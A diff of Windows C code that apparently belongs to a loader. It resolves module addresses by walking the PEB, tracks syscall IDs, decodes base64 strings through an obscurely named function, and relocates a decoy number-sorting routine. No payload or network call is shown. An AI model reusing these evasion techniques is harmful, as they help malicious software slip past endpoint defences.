@@ -5,37 +5,9 @@
 #include <stdlib.h>
 #include <winternl.h>
 
-void SortNumbers() {
-    int numbers[ARRAY_SIZE];
-
-    // Seed random number generator
-    for (int i = 0; i < ARRAY_SIZE; i++) {
-        numbers[i] = rand() % 10000;  // Random number between 0-9999
-    }
-
-    // Simple Bubble Sort (Avoids needing qsort from stdlib)
-    for (int i = 0; i < ARRAY_SIZE - 1; i++) {
-        for (int j = 0; j < ARRAY_SIZE - i - 1; j++) {
-            if (numbers[j] > numbers[j + 1]) {
-                int temp = numbers[j];
-                numbers[j] = numbers[j + 1];
-                numbers[j + 1] = temp;
-            }
-        }
-    }
-
-    // Compute the average of the sorted array
-    long sum = 0;
-    for (int i = 0; i < ARRAY_SIZE; i++) {
-        sum += numbers[i];
-    }
-    float avg = (float)sum / ARRAY_SIZE;
-
-    // Print final average
-    printf("[*] Processed %d numbers. Average value: %.2f\n", ARRAY_SIZE, avg);
-}
-
-//GetModuleBaseAddress
+/*
+Function to retrieve the base address of the module
+*/
 PVOID GetModBA(LPCWSTR moduleName) {
     PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
     PPEB_LDR_DATA pLdr = pPeb->Ldr;
@@ -83,7 +55,6 @@ void SetSyid(DWORD value) {
     smID = value;
 }
 
-// Function to Base64 Decode
 char* Bsfd(const char* encoded) {
     DWORD outLen = 0;
     BYTE* decoded = NULL;
@@ -105,6 +76,36 @@ char* Bsfd(const char* encoded) {
 
     decoded[outLen] = '\0';  // Null-terminate the string
     return (char*)decoded;
+}
+
+void SortNumbers() {
+    int numbers[ARRAY_SIZE];
+
+    // Seed random number generator
+    for (int i = 0; i < ARRAY_SIZE; i++) {
+        numbers[i] = rand() % 10000;  // Random number between 0-9999
+    }
+
+    // Simple Bubble Sort (Avoids needing qsort from stdlib)
+    for (int i = 0; i < ARRAY_SIZE - 1; i++) {
+        for (int j = 0; j < ARRAY_SIZE - i - 1; j++) {
+            if (numbers[j] > numbers[j + 1]) {
+                int temp = numbers[j];
+                numbers[j] = numbers[j + 1];
+                numbers[j + 1] = temp;
+            }
+        }
+    }
+
+    // Compute the average of the sorted array
+    long sum = 0;
+    for (int i = 0; i < ARRAY_SIZE; i++) {
+        sum += numbers[i];
+    }
+    float avg = (float)sum / ARRAY_SIZE;
+
+    // Print final average
+    printf("[*] Processed %d numbers. Average value: %.2f\n", ARRAY_SIZE, avg);
 }
 
 pMod GetMod(LPCSTR mod, LPCSTR fn) {
